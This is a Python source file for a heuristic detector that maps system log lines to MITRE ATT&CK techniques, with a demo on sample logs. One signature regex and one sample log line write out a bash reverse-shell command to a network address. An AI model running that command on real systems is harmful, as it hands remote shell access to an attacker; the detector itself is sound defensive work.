import re
import json
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class MitreMapper:
    """
    A heuristic engine to map system audit logs to MITRE ATT&CK Tactics and Techniques.
    Designed as a foundational module for Threat-Informed Defence Engines.
    """
    
    # Mocking a subset of a Technique Database
    TECHNIQUE_DB = {
        "T1110": {"name": "Brute Force", "tactic": "Credential Access"},
        "T1053": {"name": "Scheduled Task/Job", "tactic": "Execution"},
        "T1059.004": {"name": "Command and Scripting Interpreter: Unix Shell", "tactic": "Execution"},
        "T1078": {"name": "Valid Accounts", "tactic": "Defense Evasion"}
    }

    def __init__(self):
        # Regular expressions simulating heuristic signatures
        self.signatures = [
            (re.compile(r"Failed password for (invalid user )?\w+ from \d+\.\d+\.\d+\.\d+"), "T1110"),
            (re.compile(r"crontab -e"), "T1053"),
            (re.compile(r"bash -i >& /dev/tcp/\d+\.\d+\.\d+\.\d+/\d+ 0>&1"), "T1059.004"),
            (re.compile(r"session opened for user root by \(uid=0\)"), "T1078")
        ]

    def analyze_log(self, log_entry):
        """Analyzes a raw log string and returns mapped MITRE techniques."""
        matched_techniques = []
        for regex, tech_id in self.signatures:
            if regex.search(log_entry):
                matched_techniques.append({
                    "id": tech_id,
                    "name": self.TECHNIQUE_DB[tech_id]["name"],
                    "tactic": self.TECHNIQUE_DB[tech_id]["tactic"]
                })
        return matched_techniques

if __name__ == "__main__":
    mapper = MitreMapper()
    
    sample_logs = [
        "May 14 10:22:11 server sshd[1234]: Failed password for root from 192.168.1.100 port 54322 ssh2",
        "May 14 10:25:00 server bash[5678]: bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
        "May 14 10:30:15 server crond[9012]: (root) CMD (crontab -e)"
    ]
    
    print("--- MITRE ATT&CK Inference Engine Demo ---")
    for log in sample_logs:
        print(f"\n[Raw Log] {log}")
        inferences = mapper.analyze_log(log)
        if inferences:
            for inf in inferences:
                print(f"[MITRE Map] -> Tactic: {inf['tactic']} | Technique: {inf['id']} ({inf['name']})")
        else:
            print("[MITRE Map] -> No technique inferred.")
